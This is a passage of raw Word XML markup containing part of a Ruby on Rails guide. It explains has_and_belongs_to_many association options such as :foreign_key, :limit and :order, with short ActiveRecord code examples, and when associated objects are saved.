      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:foreign_key</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DE2D909" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">By convention, Rails assumes that the column in the join table used to hold the foreign key pointing to this model is the name of this model with the suffix </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>_id</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> added. The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:foreign_key</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option lets you set the name of the foreign key directly:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7344"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="23A7B515" w14:textId="77777777" w:rsidTr="00646676">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="42AD1333" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>User &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="04C658B5" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_and_belongs_to_many :friends, :class_name</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "User",</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4845CEAD" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    :foreign_key</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "this_user_id",</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3916A228" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    :association_foreign_key</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "other_user_id"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3457B42B" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="73DAA9D6" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.4.2.10 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:group</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26B27453" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:group</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option supplies an attribute name to group the result set by, using a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>GROUP BY</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> clause in the finder </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7344"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="2525565B" w14:textId="77777777" w:rsidTr="00646676">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2725581D" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Parts &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5EB220B5" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_and_belongs_to_many :assemblies, :group</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "factory"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="729DA73A" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="246EA552" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.4.2.11 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:include</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43C90079" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">You can use the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:include</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option to specify second-order associations that should be eager-loaded when this association is used.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1123F8F4" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.4.2.12 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:insert_sql</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C1257B2" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Normally Rails automatically generates the proper </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to create links between the associated classes. With the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:insert_sql</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option, you can specify a complete </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> statement to insert them yourself.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56BB2433" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.4.2.13 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:join_table</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64689EE1" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If the default name of the join table, based on lexical ordering, is not what you want, you can use the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:join_table</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option to override the default.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CA3FC3A" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.4.2.14 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:limit</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A0FF26B" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:limit</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option lets you restrict the total number of objects that will be fetched through an association.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8424"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="0FE8FF47" w14:textId="77777777" w:rsidTr="00646676">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="30D3D94D" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Parts &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4A441E10" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_and_belongs_to_many :assemblies, :order</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "created_at DESC",</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="32422368" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    :limit</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 50</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2E550D39" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="789609C7" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.4.2.15 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:offset</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F01FFF8" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:offset</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option lets you specify the starting offset for fetching objects via an association. For example, if you set </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:offset =&gt; 11</w:t>
      </w:r>
      <w:r>
        <w:t>, it will skip the first 11 records.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AC59D7D" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.4.2.16 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:order</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A37C0CB" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:order</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option dictates the order in which associated objects will be received (in the syntax used by an </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ORDER BY</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> clause).</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8522"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="300C160E" w14:textId="77777777" w:rsidTr="00646676">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="17EBF34E" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Parts &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="51E1BCB8" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_and_belongs_to_many :assemblies, :order</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "assembly_name ASC"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5C11C053" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5AB6F21F" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.4.2.17 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:readonly</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="377383B3" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If you set the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:readonly</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>true</w:t>
      </w:r>
      <w:r>
        <w:t>, then the associated objects will be read-only when retrieved via the association.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65904E34" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.4.2.18 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:select</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C151B79" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:select</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option lets you override the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>SELECT</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> clause that is used to retrieve data about the associated objects. By default, Rails retrieves all columns.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00CBD118" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.4.2.19 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:uniq</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26213AFF" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Specify the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:uniq =&gt; true</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option to remove duplicates from the collection.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63E101BB" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.4.2.20 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:validate</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A0C5802" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If you set the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:validate</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>false</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, then associated objects will not be validated whenever you save this object. By default, this is </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>true</w:t>
      </w:r>
      <w:r>
        <w:t>: associated objects will be validated when this object is saved.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56992AA1" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>4.4.3 When are Objects Saved?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D053D87" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">When you assign an object to a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>has_and_belongs_to_many</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> association, that object is automatically saved (in order to update the join table). If you assign multiple objects in one statement, then they are all saved.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D16321E" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If any of these saves fails due to validation errors, then the assignment statement returns </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>false</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and the assignment itself is cancelled.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="378D8D14" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If the parent object (the one declaring the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>has_and_belongs_to_many</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> association) is unsaved (that is, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>new_record?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> returns </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>true</w:t>
      </w:r>
      <w:r>
        <w:t>) then the child objects are not saved when they are added. All unsaved members of the association will automatically be saved when the parent is saved.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C6A0C7C" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If you want to assign an object to a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>has_and_belongs_to_many</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> association without saving the object, use the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>collection</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>.build</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B6DD12F" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>4.5 Association Callbacks</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EFEAD46" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Normal callbacks hook into the life cycle of Active Record objects, allowing you to work with those objects at various points. For example, you can use a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:before_save</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> callback to cause something to happen just before an object is saved.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B4A2EEB" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Association callbacks are similar to normal callbacks, but they are triggered by events in the life cycle of a collection. There are four available association callbacks:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17F6DB12" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="53"/>
        </w:numPr>
